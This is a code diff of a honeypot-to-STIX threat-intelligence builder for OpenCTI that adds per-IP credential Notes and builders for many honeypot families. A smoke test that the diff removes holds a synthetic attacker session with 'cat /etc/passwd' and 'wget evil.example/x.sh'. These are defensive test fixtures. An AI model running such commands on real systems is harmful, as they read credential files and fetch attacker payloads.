@@ -1,36 +1,6 @@
 """tpot2cti — STIX 2.1 object builder.
 
-The builder is stateful per-bundle: a new STIXBuilder instance is
-created at the start of each cycle, accumulates per-bundle dedup
-state (which Identities / Infrastructures / Locations have already
-been emitted in THIS bundle), and produces a list of STIX object
-dicts ready for the publisher.
-
-Per V1_SPEC.md §4 (STIX object model) the builder emits:
-
-  Foundation:    Identity (operator + sensor), Marking-Definition,
-                 Location, Autonomous-System, AttackPattern
-  Entities:      IPv4-Addr, StixFile, URL, Domain-Name, Process,
-                 Cryptographic-Key, Indicator, Note, Vulnerability
-  Relationships: Relationship, Sighting
-
-Every emitted object:
-  - has a deterministic id from `tpot2cti.stix_ids`
-  - is stamped with `created_by_ref` pointing at the operator Identity
-  - is stamped with `object_marking_refs` referencing the default TLP
-  - has `created` + `modified` timestamps in ISO 8601 UTC
-  - has `confidence` set from config
-
-The substance-filter pattern lives in `BaseParser.has_substance()` —
-the builder doesn't decide what to emit; it only knows HOW to emit
-the things the parser asked for.  The caller pattern is:
-
-    parser = get_parser(doc['type'])
-    for session in parser.correlate(events):
-        if parser.has_substance(session):
-            stix_objects = builder.build_full_session(session)
-        else:
-            stix_objects = builder.build_driveby_session(session)
+See docs/stix/builder.md for design notes.
 """
 
 from __future__ import annotations
@@ -62,8 +32,8 @@ from tpot2cti.stix_ids import (
     generate_autonomous_system_id,
     generate_city_location_id,
     generate_country_location_id,
+    generate_credential_note_id,
     generate_cryptographic_key_id,
-    generate_daily_creds_note_id,
     generate_domain_id,
     generate_file_id,
     generate_file_indicator_id,
@@ -93,6 +63,9 @@ logger = logging.getLogger(__name__)
 # OpenCTI's ~1 MB worker limit.  64 KB is generous for any reasonable
 # session summary.
 MAX_NOTE_BODY_BYTES = 64 * 1024
+#: Max distinct URL observables emitted per web session (a scanner can
+#: hit hundreds of paths; cap so one session can't balloon the bundle).
+_MAX_WEB_URLS = 25
 
 # Process command_line cap (matches PoC convention)
 MAX_COMMANDS_PER_PROCESS = 50
@@ -1053,9 +1026,9 @@ class STIXBuilder:
         WARNING: per LESSONS §7.1 we do NOT emit a per-IP per-cycle
         Activity Report.  Use this only for genuinely-per-session content
         (a Cowrie command transcript, a Honeytrap payload hexdump that's
-        worth preserving).  For aggregated content use
-        `build_daily_credentials_note()` or skip the Note entirely and
-        let the per-event Sighting carry the signal.
+        worth preserving).  For aggregated content prefer a rolling per-IP
+        Note (e.g. `build_ip_credential_note()`) or skip the Note entirely
+        and let the per-event Sighting carry the signal.
         """
         if not body_md:
             return None
@@ -1071,27 +1044,71 @@ class STIXBuilder:
         }
         return self._dedup(self._stamp(obj))
 
-    def build_daily_credentials_note(
+    def build_ip_credential_note(
         self,
-        sensor_hostname: str,
-        utc_date: str,        # YYYY-MM-DD
-        body_md: str,
-        object_refs: Optional[list[str]] = None,
+        ip: str,
+        credentials: list[dict],
+        *,
+        max_rows: int = 200,
     ) -> Optional[dict]:
-        """Per V1_SPEC §6 — one Note per sensor per UTC day with top-100 creds.
+        """One rolling Note per attacker IP summarising credential attempts.
 
-        Idempotent: same (sensor, utc_date) → same UUID, OpenCTI upserts.
+        `credentials` is the per-IP summary from the credential store
+        (each: username, password, attempts, succeeded, service, port). A
+        bruteforce of tens of thousands of pairs becomes ONE Note here — the
+        bulk lives in the store, not OpenCTI. Idempotent id → OpenCTI upserts
+        the same Note as the attacker's activity grows. Attached to the IP
+        observable via object_refs.
+
+        Rows are capped (`max_rows`, accepted creds always shown first) so a
+        spray with a huge unique-pair count can't blow the Note body.
         """
-        if not body_md:
+        if not ip or not credentials:
             return None
+        # Accepted logins first, then by attempt volume.
+        rows = sorted(
+            credentials,
+            key=lambda r: (not r.get("succeeded"), -int(r.get("attempts", 0))),
+        )
+        n_total = len(rows)
+        n_success = sum(1 for r in rows if r.get("succeeded"))
+        shown = rows[:max_rows]
+
+        def _cell(v: str) -> str:
+            # Escape pipes/newlines so the markdown table stays intact.
+            return str(v).replace("|", "\\|").replace("\n", " ")[:128] or "∅"
+
+        lines = [
+            f"# Credential attempts from {ip}",
+            "",
+            f"- **Unique pairs:** {n_total}"
+            + (f" (showing top {max_rows})" if n_total > max_rows else ""),
+            f"- **Accepted logins:** {n_success}",
+            "",
+            "| Username | Password | Attempts | Service:Port | Accepted |",
+            "|---|---|---:|---|:---:|",
+        ]
+        for r in shown:
+            lines.append(
+                f"| {_cell(r.get('username'))} | {_cell(r.get('password'))} "
+                f"| {int(r.get('attempts', 0))} "
+                f"| {_cell(r.get('service'))}:{r.get('port')} "
+                f"| {'✅' if r.get('succeeded') else ''} |"
+            )
+        body_md = "\n".join(lines)
         if len(body_md.encode("utf-8")) > MAX_NOTE_BODY_BYTES:
             body_md = body_md[:MAX_NOTE_BODY_BYTES] + "\n... [truncated]"
+
+        abstract = (
+            f"Credentials from {ip}: {n_total} unique pair(s), "
+            f"{n_success} accepted."
+        )
         obj = {
             "type": "note",
-            "id": generate_daily_creds_note_id(sensor_hostname, utc_date),
-            "abstract": f"Top 100 credential attempts — {utc_date} (UTC) — sensor: {sensor_hostname}",
+            "id": generate_credential_note_id(ip),
+            "abstract": abstract,
             "content": body_md,
-            "object_refs": object_refs or [generate_sensor_id(sensor_hostname)],
+            "object_refs": [generate_ipv4_id(ip)],
         }
         return self._dedup(self._stamp(obj))
 
@@ -1754,119 +1771,291 @@ class STIXBuilder:
 
         return out
 
+    # ──────────────────────────────────────────────────────────────────
+    # Web / HTTP honeypot family
+    # ──────────────────────────────────────────────────────────────────
 
-# ---------------------------------------------------------------------------
-# Smoke test — score plateau invariant
-# ---------------------------------------------------------------------------
-#
-# Per the PoC vs tpot2cti evaluation §7 risk R2: our `_signal_score()` adds
-# +30/+25/+35/+15 for auth_success/commands/malware/credentials. A "fully
-# substantive" Cowrie session (all four signals present) hits 100 immediately,
-# and subsequent re-emissions of the same session UUID5 must not drift the
-# score up (>100) or down. This test confirms the invariant.
-#
-# Run via:  python3 -m tpot2cti.stix.builder
+    def _build_web_session(self, session: AttackSession) -> list[dict]:
+        """Rich builder for HTTP/web honeypots.
 
-if __name__ == "__main__":
-    import logging
-    from datetime import datetime, timezone
+        Base attacker graph (IP + geo + AS + Indicator + Sighting) PLUS:
+          - URL observables for the paths the attacker requested, each
+            `related-to` the attacker IP;
+          - an AttackPattern when the parser flagged a technique
+            (`attack_type` / `mitre_technique`) or a CVE, with the IP
+            Indicator `indicates` it;
+          - a Vulnerability for each `matched_cve`, likewise `indicates`-d.
 
-    from tpot2cti.config import load_config
+        Object-graph only — no per-event Notes (LESSONS §7.1). Shared by the
+        dedicated build_<web>_session dispatch entries.
+        """
+        out = self.build_driveby_session(session)
+        if not session.src_ip or not session.events:
+            return out
+        ipv4_id = generate_ipv4_id(session.src_ip)
+        ind_id = generate_ip_indicator_id(session.src_ip)
 
-    logging.basicConfig(level=logging.WARNING)
+        # URL observables (parser-validated full URLs), capped.
+        seen: set[str] = set()
+        for url in session.urls:
+            if len(seen) >= _MAX_WEB_URLS:
+                break
+            if url in seen:
+                continue
+            seen.add(url)
+            u = self.build_url(url, session=session)
+            if not u:
+                continue
+            out.append(u)
+            if rel := self.build_relationship(
+                ipv4_id, "related-to", u["id"],
+                description=f"{session.src_ip} requested {url}",
+            ):
+                out.append(rel)
 
-    # Load config (the test depends on real .env values for org/TLP/etc.).
-    cfg = load_config()
+        # Aggregate exploit signals across the session's events.
+        cves: set[str] = set()
+        attack_types: set[str] = set()
+        mitre: set[str] = set()
+        for ev in session.events:
+            m = ev.meta
+            if c := m.get("matched_cve"):
+                cves.add(str(c))
+            if a := m.get("attack_type"):
+                attack_types.add(str(a))
+            if t := m.get("mitre_technique"):
+                mitre.add(str(t))
 
-    # Build a fully-substantive synthetic Cowrie session.
-    now = datetime.now(timezone.utc)
-    base_event = ParsedEvent(
-        src_ip="203.0.113.99",
-        timestamp=now,
-        sensor_hostname="smoketest-node",
-        event_type="Cowrie",
-        src_country_code="US",
-        src_country_name="United States",
-        src_asn=64500,
-        src_as_org="ExampleNet (RFC5398 test ASN)",
-        dst_port=22,
-        session_id="smoketest-session-0001",
-    )
-    session = AttackSession.from_event(base_event)
-    session.auth_success = True
-    session.commands = ["cat /etc/passwd", "wget evil.example/x.sh"]
-    session.malware_hashes = ["a" * 64]
-    session.credentials_tried = [("root", "123456"), ("root", "admin")]
+        # AttackPattern — only when a real technique/CVE was seen (no AP for
+        # a bare probe, to avoid flooding OpenCTI with empty patterns).
+        mitre_id = next(iter(sorted(mitre)), None)
+        ap_names = set(attack_types)
+        if not ap_names and (cves or mitre):
+            ap_names = {"Web application exploit attempt"}
+        for name in sorted(ap_names):
+            ap = self.build_attack_pattern(name, mitre_id, session=session)
+            if not ap:
+                continue
+            out.append(ap)
+            if ind_id and (rel := self.build_relationship(
+                ind_id, "indicates", ap["id"],
+                description=f"{session.event_type} technique from {session.src_ip}",
+            )):
+                out.append(rel)
 
-    expected_score = _signal_score(session)
-    assert expected_score == 100, (
-        f"Expected fully-substantive Cowrie session to score 100; "
-        f"got {expected_score}. _signal_score weights may have drifted."
-    )
+        # Vulnerability per matched CVE signature.
+        for cve in sorted(cves):
+            v = self.build_vulnerability(
+                cve,
+                description=(
+                    f"Exploit attempt observed via {session.event_type} "
+                    f"from {session.src_ip}."
+                ),
+            )
+            if not v:
+                continue
+            out.append(v)
+            if ind_id and (rel := self.build_relationship(
+                ind_id, "indicates", v["id"],
+                description=f"{session.src_ip} attempted to exploit {cve}",
+            )):
+                out.append(rel)
+        return out
 
-    # Build the same indicator 5 times across 5 fresh builders (simulating
-    # 5 consecutive cycles). The score must stay at 100 each time.
-    scores: list[int] = []
-    ids: set[str] = set()
-    for cycle_n in range(5):
-        b = STIXBuilder(cfg)
-        ind = b.build_ip_indicator(
-            session.src_ip, session=session, session_count=1,
+    # Dedicated per-type entries (registered in main._PARSER_DISPATCH).
+    def build_galah_session(self, session: AttackSession) -> list[dict]:
+        return self._build_web_session(session)
+
+    def build_tanner_session(self, session: AttackSession) -> list[dict]:
+        return self._build_web_session(session)
+
+    def build_h0neytr4p_session(self, session: AttackSession) -> list[dict]:
+        return self._build_web_session(session)
+
+    def build_elasticpot_session(self, session: AttackSession) -> list[dict]:
+        return self._build_web_session(session)
+
+    def build_ciscoasa_session(self, session: AttackSession) -> list[dict]:
+        return self._build_web_session(session)
+
+    def build_wordpot_session(self, session: AttackSession) -> list[dict]:
+        return self._build_web_session(session)
+
+    def build_nginx_session(self, session: AttackSession) -> list[dict]:
+        return self._build_web_session(session)
+
+    def build_honeyaml_session(self, session: AttackSession) -> list[dict]:
+        return self._build_web_session(session)
+
+    # ──────────────────────────────────────────────────────────────────
+    # Malware-drop family (file captures + downloads)
+    # ──────────────────────────────────────────────────────────────────
+
+    def _build_malware_session(self, session: AttackSession) -> list[dict]:
+        """Base attacker graph + dropped files (File + File-Indicator
+        `based-on` it), download URLs/domains, and a command Process —
+        mirroring the Cowrie malware path. Each extra is gated on its
+        signal, so a bare connection degrades to the base graph."""
+        out = self.build_driveby_session(session)
+        if not session.src_ip or not session.events:
+            return out
+        ipv4_id = generate_ipv4_id(session.src_ip)
+
+        if session.commands:
+            proc = self.build_process(session, session.commands)
+            if proc:
+                out.append(proc)
+                if rel := self.build_relationship(
+                    proc["id"], "related-to", ipv4_id,
+                    description=f"Commands executed by {session.src_ip}",
+                ):
+                    out.append(rel)
+
+        for sha256 in session.malware_hashes:
+            f = self.build_file(sha256, session=session)
+            if not f:
+                continue
+            out.append(f)
+            if rel := self.build_relationship(
+                f["id"], "related-to", ipv4_id,
+                description=f"File dropped by {session.src_ip}",
+            ):
+                out.append(rel)
+            f_ind = self.build_file_indicator(sha256, session=session)
+            if f_ind:
+                out.append(f_ind)
+                if rel := self.build_relationship(
+                    f_ind["id"], "based-on", f["id"],
+                    description=f"Indicator for file {sha256[:16]}…",
+                ):
+                    out.append(rel)
+
+        for url in session.urls:
+            u = self.build_url(url, session=session)
+            if u:
+                out.append(u)
+                if rel := self.build_relationship(
+                    u["id"], "related-to", ipv4_id,
+                    description=f"Download URL from {session.src_ip}",
+                ):
+                    out.append(rel)
+        for dom in session.domains:
+            d = self.build_domain(dom, session=session)
+            if d:
+                out.append(d)
+                if rel := self.build_relationship(
+                    d["id"], "related-to", ipv4_id,
+                    description=f"Domain referenced by {session.src_ip}",
+                ):
+                    out.append(rel)
+        return out
+
+    def build_adbhoney_session(self, session: AttackSession) -> list[dict]:
+        return self._build_malware_session(session)
+
+    def build_dionaea_session(self, session: AttackSession) -> list[dict]:
+        return self._build_malware_session(session)
+
+    # ──────────────────────────────────────────────────────────────────
+    # Fingerprint family (passive TLS/SSH client fingerprints)
+    # ──────────────────────────────────────────────────────────────────
+
+    def build_fatt_session(self, session: AttackSession) -> list[dict]:
+        """Base attacker graph + the attacker's CLIENT fingerprints (HASSH
+        SSH-client hash, JA3 TLS-client hash) as Cryptographic-Key SCOs
+        `related-to` the IP — so the same tool seen from different IPs
+        links onto one SCO in OpenCTI. (ja3s is the server's — skipped.)"""
+        out = self.build_driveby_session(session)
+        if not session.src_ip:
+            return out
+        ipv4_id = generate_ipv4_id(session.src_ip)
+        for fp in (session.hassh, session.ja3):
+            if not fp:
+                continue
+            ck = self.build_cryptographic_key(fp, session=session)
+            if ck:
+                out.append(ck)
+                if rel := self.build_relationship(
+                    ck["id"], "related-to", ipv4_id,
+                    description=f"Client fingerprint observed from {session.src_ip}",
+                ):
+                    out.append(rel)
+        return out
+
+    # ──────────────────────────────────────────────────────────────────
+    # Protocol / ICS / VoIP / shell family
+    # ──────────────────────────────────────────────────────────────────
+
+    def _build_protocol_session(self, session: AttackSession, ap_name: str) -> list[dict]:
+        """Base attacker graph + a protocol-targeting AttackPattern (deduped;
+        IP Indicator `indicates` it) + a command Process when present.
+
+        The AttackPattern is emitted only when the session shows real
+        interaction (commands, parser-populated event meta, or >2 events),
+        so a bare connect stays at the base graph and we don't mint patterns
+        for noise. Credential pairs for these types are handled separately
+        as the per-IP credential Note (see run_cycle), not here."""
+        out = self.build_driveby_session(session)
+        if not session.src_ip or not session.events:
+            return out
+        ipv4_id = generate_ipv4_id(session.src_ip)
+        ind_id = generate_ip_indicator_id(session.src_ip)
+
+        interacted = (
+            bool(session.commands)
+            or bool(session.credentials_tried)
+            or any(e.meta for e in session.events)
+            or session.event_count > 2
         )
-        assert ind is not None, "indicator build returned None"
-        scores.append(ind["x_opencti_score"])
-        ids.add(ind["id"])
+        if interacted:
+            ap = self.build_attack_pattern(ap_name, session=session)
+            if ap:
+                out.append(ap)
+                if ind_id and (rel := self.build_relationship(
+                    ind_id, "indicates", ap["id"],
+                    description=f"{session.event_type} activity from {session.src_ip}",
+                )):
+                    out.append(rel)
+        if session.commands:
+            proc = self.build_process(session, session.commands)
+            if proc:
+                out.append(proc)
+                if rel := self.build_relationship(
+                    proc["id"], "related-to", ipv4_id,
+                    description=f"Commands from {session.src_ip}",
+                ):
+                    out.append(rel)
+        return out
 
-    assert all(s == 100 for s in scores), (
-        f"Score drift detected across 5 emissions: {scores}. "
-        f"Expected [100, 100, 100, 100, 100]. The dedup or stamp logic "
-        f"must not modify x_opencti_score across re-emissions."
-    )
-    assert len(ids) == 1, (
-        f"Expected deterministic UUID5 to collapse to one indicator id "
-        f"across 5 builders; got {len(ids)} distinct ids."
-    )
-    print(f"OK: indicator id stable across 5 emissions: {next(iter(ids))}")
-    print(f"OK: score stable at 100 across 5 emissions")
+    def build_conpot_session(self, session: AttackSession) -> list[dict]:
+        return self._build_protocol_session(session, "ICS/SCADA protocol interaction")
 
-    # Also verify a drive-by (no signals) lands at the BASELINE.
-    driveby_ev = ParsedEvent(
-        src_ip="203.0.113.10",
-        timestamp=now,
-        sensor_hostname="smoketest-node",
-        event_type="Honeytrap",
-        dst_port=22,
-    )
-    driveby_session = AttackSession.from_event(driveby_ev)
-    b = STIXBuilder(cfg)
-    driveby_ind = b.build_ip_indicator(
-        driveby_session.src_ip, session=driveby_session, session_count=1,
-    )
-    assert driveby_ind is not None
-    assert driveby_ind["x_opencti_score"] == BASELINE_INDICATOR_SCORE, (
-        f"Drive-by indicator should score at BASELINE={BASELINE_INDICATOR_SCORE}; "
-        f"got {driveby_ind['x_opencti_score']}"
-    )
-    print(f"OK: drive-by indicator scores at baseline ({BASELINE_INDICATOR_SCORE})")
+    def build_dicompot_session(self, session: AttackSession) -> list[dict]:
+        return self._build_protocol_session(session, "DICOM medical-imaging probe")
 
-    # And verify a partially-substantive session (auth_success only) lands
-    # in the middle, not at extremes.
-    partial_ev = ParsedEvent(
-        src_ip="203.0.113.20",
-        timestamp=now,
-        sensor_hostname="smoketest-node",
-        event_type="Cowrie",
-        dst_port=22,
-    )
-    partial_session = AttackSession.from_event(partial_ev)
-    partial_session.auth_success = True   # +30
-    expected_partial = BASELINE_INDICATOR_SCORE + 30
-    actual_partial = _signal_score(partial_session)
-    assert actual_partial == expected_partial, (
-        f"Partial session (auth_success only) expected {expected_partial}; "
-        f"got {actual_partial}"
-    )
-    print(f"OK: partial session (auth only) scores {actual_partial} "
-          f"(baseline {BASELINE_INDICATOR_SCORE} + 30 for auth_success)")
+    def build_ipphoney_session(self, session: AttackSession) -> list[dict]:
+        return self._build_protocol_session(session, "IPP printer-service probe")
 
-    print("\nAll score-plateau smoke checks passed.")
+    def build_redishoneypot_session(self, session: AttackSession) -> list[dict]:
+        return self._build_protocol_session(session, "Redis unauthorized-access attempt")
+
+    def build_sentrypeer_session(self, session: AttackSession) -> list[dict]:
+        return self._build_protocol_session(session, "SIP/VoIP fraud probe")
+
+    def build_miniprint_session(self, session: AttackSession) -> list[dict]:
+        return self._build_protocol_session(session, "Printer PJL/raw-port probe")
+
+    def build_medpot_session(self, session: AttackSession) -> list[dict]:
+        return self._build_protocol_session(session, "HL7 medical-messaging probe")
+
+    def build_router_session(self, session: AttackSession) -> list[dict]:
+        return self._build_protocol_session(session, "Router/Telnet console interaction")
+
+    def build_heralding_session(self, session: AttackSession) -> list[dict]:
+        return self._build_protocol_session(session, "Credential brute-force attempt")
+
+    def build_mailoney_session(self, session: AttackSession) -> list[dict]:
+        return self._build_protocol_session(session, "SMTP abuse / relay probe")
+
+    def build_beelzebub_session(self, session: AttackSession) -> list[dict]:
+        return self._build_protocol_session(session, "Interactive shell session (LLM honeypot)")
